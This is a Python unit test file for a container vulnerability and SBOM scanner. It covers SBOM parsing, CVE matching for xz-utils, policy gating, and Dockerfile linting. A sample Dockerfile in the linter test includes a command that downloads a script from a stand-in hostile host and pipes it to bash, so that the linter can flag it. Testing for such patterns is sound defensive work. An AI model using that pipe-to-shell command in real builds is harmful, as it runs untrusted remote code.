#!/usr/bin/env python3
"""
Unit tests for Container Image Vulnerability & SBOM Scanner CLI
Author: Luis García Villena
"""

import json
import os
import sys
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from container_vuln_scanner import ContainerVulnScanner


class TestContainerVulnScanner(unittest.TestCase):

    def setUp(self):
        self.scanner = ContainerVulnScanner(fail_severity="HIGH")

    def test_parse_cyclonedx_sbom(self):
        cyclonedx_payload = json.dumps({
            "bomFormat": "CycloneDX",
            "specVersion": "1.5",
            "components": [
                {"name": "xz-utils", "version": "5.6.0", "type": "library"},
                {"name": "openssl", "version": "3.1.4", "type": "library"}
            ]
        })
        components = self.scanner.parse_sbom(cyclonedx_payload)
        self.assertEqual(len(components), 2)
        self.assertEqual(components[0]["name"], "xz-utils")
        self.assertEqual(components[0]["version"], "5.6.0")

    def test_parse_spdx_sbom(self):
        spdx_payload = json.dumps({
            "packages": [
                {"name": "curl", "versionInfo": "8.3.0"}
            ]
        })
        components = self.scanner.parse_sbom(spdx_payload)
        self.assertEqual(len(components), 1)
        self.assertEqual(components[0]["name"], "curl")
        self.assertEqual(components[0]["version"], "8.3.0")

    def test_vulnerability_matching_and_gating(self):
        components = [
            {"name": "xz-utils", "version": "5.6.0"},
            {"name": "clean-package", "version": "1.0.0"}
        ]
        res = self.scanner.scan_components(components)
        self.assertEqual(res["total_vulnerabilities"], 1)
        vuln = res["vulnerabilities"][0]
        self.assertEqual(vuln["cve"], "CVE-2024-3094")
        self.assertEqual(vuln["severity"], "CRITICAL")
        self.assertEqual(vuln["cvss_v3"], 10.0)
        self.assertEqual(res["policy_status"], "FAILED")

    def test_clean_components_pass_policy(self):
        components = [
            {"name": "safe-lib", "version": "2.0.0"},
            {"name": "hardened-runtime", "version": "1.5.0"}
        ]
        res = self.scanner.scan_components(components)
        self.assertEqual(res["total_vulnerabilities"], 0)
        self.assertEqual(res["policy_status"], "PASSED")

    def test_dockerfile_linter_findings(self):
        dockerfile = """
        FROM python:latest
        RUN curl https://bad.sh | bash
        EXPOSE 22
        CMD ["python", "app.py"]
        """
        res = self.scanner.lint_dockerfile(dockerfile)
        self.assertGreater(res["findings_count"], 0)
        ids = [f["id"] for f in res["findings"]]
        self.assertIn("DOCKER-01", ids)  # latest tag
        self.assertIn("DOCKER-03", ids)  # curl | bash
        self.assertIn("DOCKER-04", ids)  # SSH port 22
        self.assertIn("DOCKER-05", ids)  # missing USER


if __name__ == "__main__":
    unittest.main()
